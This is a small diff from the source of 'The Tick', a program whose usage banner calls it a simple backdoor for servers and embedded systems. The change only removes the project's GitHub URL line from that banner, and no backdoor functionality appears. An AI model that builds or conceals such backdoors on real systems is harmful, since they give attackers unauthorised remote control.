@@ -46,7 +46,6 @@ int main(int argc, char *argv[])
     if (s.hostname[0] == 0 || s.port == 0) {
         LOG("\n"
             "The Tick, a simple backdoor for servers and embedded systems.\n"
-            "           https://github.com/MarioVilas/thetick\n"
 #if TICK_CONFIG_USE_ARGV
             "\n"
             "Usage:\n"
